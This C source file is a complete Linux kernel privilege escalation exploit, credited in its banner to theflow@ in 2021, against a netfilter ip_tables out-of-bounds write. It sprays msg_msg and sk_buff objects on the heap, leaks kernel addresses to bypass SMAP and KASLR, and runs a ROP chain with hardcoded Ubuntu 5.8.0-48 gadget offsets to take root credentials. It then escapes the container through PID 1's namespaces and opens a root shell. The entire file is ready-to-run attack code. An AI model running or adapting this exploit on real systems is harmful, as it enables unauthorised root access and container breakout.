#define _GNU_SOURCE
#include <err.h>
#include <errno.h>
#include <fcntl.h>
#include <inttypes.h>
#include <sched.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <net/if.h>
#include <netinet/in.h>
#include <sys/ipc.h>
#include <sys/msg.h>
#include <sys/socket.h>
#include <sys/syscall.h>
#include <linux/netfilter_ipv4/ip_tables.h>

#define PAGE_SIZE 0x1000
#define PRIMARY_SIZE 0x1000
#define SECONDARY_SIZE 0x400
#define NUM_SOCKETS 4
#define NUM_SKBUFFS 128
#define NUM_PIPEFDS 256
#define NUM_MSQIDS 4096
#define HOLE_STEP 1024
#define MTYPE_PRIMARY 0x41
#define MTYPE_SECONDARY 0x42
#define MTYPE_FAKE 0x1337
#define MSG_TAG 0xAAAAAAAA

#define KERNEL_UBUNTU_5_8_0_48 1

#ifdef KERNEL_UBUNTU_5_8_0_48
#define PUSH_RSI_JMP_QWORD_PTR_RSI_39 0x6E9783
#define POP_RSP_RET 0x9B6C0
#define ADD_RSP_D0_RET 0x6DB59
#define ENTER_0_0_POP_RBX_POP_R12_POP_RBP_RET 0x1A21C3
#define MOV_QWORD_PTR_R12_RBX_POP_RBX_POP_R12_POP_RBP_RET 0x84DE3
#define PUSH_QWORD_PTR_RBP_A_POP_RBP_RET 0x6A98FF
#define MOV_RSP_RBP_POP_RBP_RET 0x891BC
#define POP_RCX_RET 0xF5633
#define POP_RSI_RET 0x1ABAAE
#define POP_RDI_RET 0x89250
#define POP_RBP_RET 0x5AE
#define MOV_RDI_RAX_JNE_XOR_EAX_EAX_RET 0x557894
#define CMP_RCX_4_JNE_POP_RBP_RET 0x724DB
#define FIND_TASK_BY_VPID 0xBFBC0
#define SWITCH_TASK_NAMESPACES 0xC7A50
#define COMMIT_CREDS 0xC8C80
#define PREPARE_KERNEL_CRED 0xC9110
#define ANON_PIPE_BUF_OPS 0x1078380
#define INIT_NSPROXY 0x1663080
#else
#error "No kernel version defined"
#endif

struct msg_msg {
  uint64_t m_list_next;
  uint64_t m_list_prev;
  uint64_t m_type;
  uint64_t m_ts;
  uint64_t next;
  uint64_t security;
};

struct msg_msgseg {
  uint64_t next;
};

struct pipe_buffer {
  uint64_t page;
  uint32_t offset;
  uint32_t len;
  uint64_t ops;
  uint32_t flags;
  uint32_t pad;
  uint64_t private;
};

struct pipe_buf_operations {
  uint64_t confirm;
  uint64_t release;
  uint64_t steal;
  uint64_t get;
};

struct {
  long mtype;
  char mtext[PRIMARY_SIZE - sizeof(struct msg_msg)];
} msg_primary;

struct {
  long mtype;
  char mtext[SECONDARY_SIZE - sizeof(struct msg_msg)];
} msg_secondary;

struct {
  long mtype;
  char mtext[PAGE_SIZE - sizeof(struct msg_msg) + PAGE_SIZE - sizeof(struct msg_msgseg)];
} msg_fake;

void build_msg_msg(struct msg_msg *msg, uint64_t next, uint64_t prev, uint64_t m_ts, uint64_t n) {
  msg->m_list_next = next;
  msg->m_list_prev = prev;
  msg->m_type = MTYPE_FAKE;
  msg->m_ts = m_ts;
  msg->next = n;
  msg->security = 0;
}

int write_msg(int msqid, const void *msgp, size_t msgsz, long msgtyp) {
  *(long *)msgp = msgtyp;
  if (msgsnd(msqid, msgp, msgsz - sizeof(long), 0) < 0) { perror("msgsnd"); return -1; }
  return 0;
}

int peek_msg(int msqid, void *msgp, size_t msgsz, long msgtyp) {
  if (msgrcv(msqid, msgp, msgsz - sizeof(long), msgtyp, MSG_COPY | IPC_NOWAIT) < 0) { perror("msgrcv"); return -1; }
  return 0;
}

int read_msg(int msqid, void *msgp, size_t msgsz, long msgtyp) {
  if (msgrcv(msqid, msgp, msgsz - sizeof(long), msgtyp, 0) < 0) { perror("msgrcv"); return -1; }
  return 0;
}

int spray_skbuff(int ss[NUM_SOCKETS][2], const void *buf, size_t size) {
  for (int i = 0; i < NUM_SOCKETS; i++)
    for (int j = 0; j < NUM_SKBUFFS; j++)
      if (write(ss[i][0], buf, size) < 0) { perror("write"); return -1; }
  return 0;
}

int free_skbuff(int ss[NUM_SOCKETS][2], void *buf, size_t size) {
  for (int i = 0; i < NUM_SOCKETS; i++)
    for (int j = 0; j < NUM_SKBUFFS; j++)
      if (read(ss[i][1], buf, size) < 0) { perror("read"); return -1; }
  return 0;
}

int trigger_oob_write(int s) {
  struct __attribute__((__packed__)) {
    struct ipt_replace replace;
    struct ipt_entry entry;
    struct xt_entry_match match;
    char pad[0x108 + PRIMARY_SIZE - 0x200 - 0x2];
    struct xt_entry_target target;
  } data = {0};
  data.replace.num_counters = 1;
  data.replace.num_entries = 1;
  data.replace.size = (sizeof(data.entry) + sizeof(data.match) + sizeof(data.pad) + sizeof(data.target));
  data.entry.next_offset = (sizeof(data.entry) + sizeof(data.match) + sizeof(data.pad) + sizeof(data.target));
  data.entry.target_offset = (sizeof(data.entry) + sizeof(data.match) + sizeof(data.pad));
  data.match.u.user.match_size = (sizeof(data.match) + sizeof(data.pad));
  strcpy(data.match.u.user.name, "icmp");
  data.match.u.user.revision = 0;
  data.target.u.user.target_size = sizeof(data.target);
  strcpy(data.target.u.user.name, "NFQUEUE");
  data.target.u.user.revision = 1;
  if (setsockopt(s, SOL_IP, IPT_SO_SET_REPLACE, &data, sizeof(data)) != 0) {
    if (errno == ENOPROTOOPT) { printf("ip_tables module not loaded\n"); return -1; }
  }
  return 0;
}

void build_krop(char *buf, uint64_t kbase, uint64_t scratch) {
#ifdef KERNEL_UBUNTU_5_8_0_48
  *(uint64_t *)&buf[0x39] = kbase + POP_RSP_RET;
  *(uint64_t *)&buf[0x00] = kbase + ADD_RSP_D0_RET;
  uint64_t *rop = (uint64_t *)&buf[0xD8];
  *rop++ = kbase + ENTER_0_0_POP_RBX_POP_R12_POP_RBP_RET;
  *rop++ = scratch;
  *rop++ = 0xDEADBEEF;
  *rop++ = kbase + MOV_QWORD_PTR_R12_RBX_POP_RBX_POP_R12_POP_RBP_RET;
  *rop++ = 0xDEADBEEF;
  *rop++ = 0xDEADBEEF;
  *rop++ = 0xDEADBEEF;
  *rop++ = kbase + POP_RDI_RET;
  *rop++ = 0;
  *rop++ = kbase + PREPARE_KERNEL_CRED;
  *rop++ = kbase + POP_RCX_RET;
  *rop++ = 4;
  *rop++ = kbase + CMP_RCX_4_JNE_POP_RBP_RET;
  *rop++ = 0xDEADBEEF;
  *rop++ = kbase + MOV_RDI_RAX_JNE_XOR_EAX_EAX_RET;
  *rop++ = kbase + COMMIT_CREDS;
  *rop++ = kbase + POP_RDI_RET;
  *rop++ = 1;
  *rop++ = kbase + FIND_TASK_BY_VPID;
  *rop++ = kbase + POP_RCX_RET;
  *rop++ = 4;
  *rop++ = kbase + CMP_RCX_4_JNE_POP_RBP_RET;
  *rop++ = 0xDEADBEEF;
  *rop++ = kbase + MOV_RDI_RAX_JNE_XOR_EAX_EAX_RET;
  *rop++ = kbase + POP_RSI_RET;
  *rop++ = kbase + INIT_NSPROXY;
  *rop++ = kbase + SWITCH_TASK_NAMESPACES;
  *rop++ = kbase + POP_RBP_RET;
  *rop++ = scratch - 0xA;
  *rop++ = kbase + PUSH_QWORD_PTR_RBP_A_POP_RBP_RET;
  *rop++ = kbase + MOV_RSP_RBP_POP_RBP_RET;
#endif
}

int setup_sandbox(void) {
  if (unshare(CLONE_NEWUSER) < 0) { perror("unshare user"); return -1; }
  if (unshare(CLONE_NEWNET) < 0) { perror("unshare net"); return -1; }
  cpu_set_t set;
  CPU_ZERO(&set);
  CPU_SET(0, &set);
  if (sched_setaffinity(getpid(), sizeof(set), &set) < 0) { perror("sched_affinity"); return -1; }
  return 0;
}

int main(int argc, char *argv[]) {
  int s, fd, pipefd[NUM_PIPEFDS][2], msqid[NUM_MSQIDS], ss[NUM_SOCKETS][2];
  char primary_buf[PRIMARY_SIZE - 0x140];
  char secondary_buf[SECONDARY_SIZE - 0x140];
  struct msg_msg *msg;
  uint64_t pipe_buffer_ops = 0, kheap_addr = 0, kbase_addr = 0;
  int fake_idx = -1, real_idx = -1;

  printf("[+] Linux Privilege Escalation by theflow@ - 2021\n[+] STAGE 0: Initialization\n");
  printf("[*] Setting up namespace sandbox...\n");
  if (setup_sandbox() < 0) goto err;
  printf("[*] Initializing sockets and message queues...\n");
  if ((s = socket(AF_INET, SOCK_STREAM, 0)) < 0) { perror("socket"); goto err; }
  for (int i = 0; i < NUM_SOCKETS; i++)
    if (socketpair(AF_UNIX, SOCK_STREAM, 0, ss[i]) < 0) { perror("socketpair"); goto err; }
  for (int i = 0; i < NUM_MSQIDS; i++)
    if ((msqid[i] = msgget(IPC_PRIVATE, IPC_CREAT | 0666)) < 0) { perror("msgget"); goto err; }

  printf("[+] STAGE 1: Memory corruption\n[*] Spraying primary messages...\n");
  for (int i = 0; i < NUM_MSQIDS; i++) {
    memset(&msg_primary, 0, sizeof(msg_primary));
    *(int *)&msg_primary.mtext[0] = MSG_TAG;
    *(int *)&msg_primary.mtext[4] = i;
    if (write_msg(msqid[i], &msg_primary, sizeof(msg_primary), MTYPE_PRIMARY) < 0) goto err;
  }
  printf("[*] Spraying secondary messages...\n");
  for (int i = 0; i < NUM_MSQIDS; i++) {
    memset(&msg_secondary, 0, sizeof(msg_secondary));
    *(int *)&msg_secondary.mtext[0] = MSG_TAG;
    *(int *)&msg_secondary.mtext[4] = i;
    if (write_msg(msqid[i], &msg_secondary, sizeof(msg_secondary), MTYPE_SECONDARY) < 0) goto err;
  }
  printf("[*] Creating holes in primary messages...\n");
  for (int i = HOLE_STEP; i < NUM_MSQIDS; i += HOLE_STEP)
    if (read_msg(msqid[i], &msg_primary, sizeof(msg_primary), MTYPE_PRIMARY) < 0) goto err;

  printf("[*] Triggering out-of-bounds write...\n");
  if (trigger_oob_write(s) < 0) goto err;

  printf("[*] Searching for corrupted primary message...\n");
  for (int i = 0; i < NUM_MSQIDS; i++) {
    if (i != 0 && (i % HOLE_STEP) == 0) continue;
    if (peek_msg(msqid[i], &msg_secondary, sizeof(msg_secondary), 1) < 0) goto err;
    if (*(int *)&msg_secondary.mtext[0] != MSG_TAG) { printf("Could not corrupt\n"); goto err; }
    if (*(int *)&msg_secondary.mtext[4] != i) { fake_idx = i; real_idx = *(int *)&msg_secondary.mtext[4]; break; }
  }
  if (fake_idx == -1) { printf("Could not find corrupted message\n"); goto err; }
  printf("[+] fake_idx: %x real_idx: %x\n", fake_idx, real_idx);

  printf("[+] STAGE 2: SMAP bypass\n[*] Freeing real secondary message...\n");
  if (read_msg(msqid[real_idx], &msg_secondary, sizeof(msg_secondary), MTYPE_SECONDARY) < 0) goto err;
  printf("[*] Spraying fake secondary messages...\n");
  memset(secondary_buf, 0, sizeof(secondary_buf));
  build_msg_msg((void *)secondary_buf, 0x41414141, 0x42424242, PAGE_SIZE - sizeof(struct msg_msg), 0);
  if (spray_skbuff(ss, secondary_buf, sizeof(secondary_buf)) < 0) goto err;
  printf("[*] Leaking adjacent secondary message...\n");
  if (peek_msg(msqid[fake_idx], &msg_fake, sizeof(msg_fake), 1) < 0) goto err;
  if (*(int *)&msg_fake.mtext[SECONDARY_SIZE] != MSG_TAG) { printf("Leak invalid\n"); goto err; }
  msg = (struct msg_msg *)&msg_fake.mtext[SECONDARY_SIZE - sizeof(struct msg_msg)];
  kheap_addr = msg->m_list_next;
  if (kheap_addr & (PRIMARY_SIZE - 1)) kheap_addr = msg->m_list_prev;
  printf("[+] kheap_addr: %" PRIx64 "\n", kheap_addr);
  if ((kheap_addr & 0xFFFF000000000000) != 0xFFFF000000000000) { printf("Bad heap addr\n"); goto err; }

  printf("[*] Freeing fake secondary messages...\n");
  free_skbuff(ss, secondary_buf, sizeof(secondary_buf));
  printf("[*] Spraying fake secondary messages...\n");
  memset(secondary_buf, 0, sizeof(secondary_buf));
  build_msg_msg((void *)secondary_buf, 0x41414141, 0x42424242, sizeof(msg_fake.mtext), kheap_addr - sizeof(struct msg_msgseg));
  if (spray_skbuff(ss, secondary_buf, sizeof(secondary_buf)) < 0) goto err;
  printf("[*] Leaking primary message...\n");
  if (peek_msg(msqid[fake_idx], &msg_fake, sizeof(msg_fake), 1) < 0) goto err;
  if (*(int *)&msg_fake.mtext[PAGE_SIZE] != MSG_TAG) { printf("Leak2 invalid\n"); goto err; }
  msg = (struct msg_msg *)&msg_fake.mtext[PAGE_SIZE - sizeof(struct msg_msg)];
  kheap_addr = msg->m_list_next;
  if (kheap_addr & (SECONDARY_SIZE - 1)) kheap_addr = msg->m_list_prev;
  kheap_addr -= SECONDARY_SIZE;
  printf("[+] kheap_addr: %" PRIx64 "\n", kheap_addr);

  printf("[+] STAGE 3: KASLR bypass\n[*] Freeing fake secondary messages...\n");
  free_skbuff(ss, secondary_buf, sizeof(secondary_buf));
  printf("[*] Spraying fake secondary messages...\n");
  memset(secondary_buf, 0, sizeof(secondary_buf));
  build_msg_msg((void *)secondary_buf, kheap_addr, kheap_addr, 0, 0);
  if (spray_skbuff(ss, secondary_buf, sizeof(secondary_buf)) < 0) goto err;
  printf("[*] Freeing sk_buff data buffer...\n");
  if (read_msg(msqid[fake_idx], &msg_fake, sizeof(msg_fake), MTYPE_FAKE) < 0) goto err;
  printf("[*] Spraying pipe_buffer objects...\n");
  for (int i = 0; i < NUM_PIPEFDS; i++) {
    if (pipe(pipefd[i]) < 0) { perror("pipe"); goto err; }
    if (write(pipefd[i][1], "pwn", 3) < 0) { perror("write"); goto err; }
  }
  printf("[*] Leaking pipe_buffer object...\n");
  for (int i = 0; i < NUM_SOCKETS; i++)
    for (int j = 0; j < NUM_SKBUFFS; j++) {
      if (read(ss[i][1], secondary_buf, sizeof(secondary_buf)) < 0) { perror("read"); goto err; }
      if (*(uint64_t *)&secondary_buf[0x10] != MTYPE_FAKE)
        pipe_buffer_ops = *(uint64_t *)&secondary_buf[0x10];
    }
  kbase_addr = pipe_buffer_ops - ANON_PIPE_BUF_OPS;
  printf("[+] anon_pipe_buf_ops: %" PRIx64 "\n[+] kbase_addr: %" PRIx64 "\n", pipe_buffer_ops, kbase_addr);

  printf("[+] STAGE 4: Kernel code execution\n[*] Spraying fake pipe_buffer objects...\n");
  memset(secondary_buf, 0, sizeof(secondary_buf));
  struct pipe_buffer *buf = (struct pipe_buffer *)&secondary_buf;
  buf->ops = kheap_addr + 0x290;
  struct pipe_buf_operations *ops = (struct pipe_buf_operations *)&secondary_buf[0x290];
  ops->release = kbase_addr + PUSH_RSI_JMP_QWORD_PTR_RSI_39;
  build_krop(secondary_buf, kbase_addr, kheap_addr + 0x2B0);
  if (spray_skbuff(ss, secondary_buf, sizeof(secondary_buf)) < 0) goto err;
  printf("[*] Releasing pipe_buffer objects...\n");
  for (int i = 0; i < NUM_PIPEFDS; i++) { close(pipefd[i][0]); close(pipefd[i][1]); }
  printf("[*] Checking for root...\n");
  if ((fd = open("/etc/shadow", O_RDONLY)) < 0) { printf("Could not gain root\n"); goto err; }
  close(fd);
  printf("[+] Root privileges gained!\n[+] STAGE 5: Post-exploitation\n[*] Escaping container...\n");
  setns(open("/proc/1/ns/mnt", O_RDONLY), 0);
  setns(open("/proc/1/ns/pid", O_RDONLY), 0);
  setns(open("/proc/1/ns/net", O_RDONLY), 0);
  printf("[*] Popping root shell...\n");
  char *args[] = {"/bin/bash", "-i", NULL};
  execve(args[0], args, NULL);
  return 0;
err:
  return 1;
}
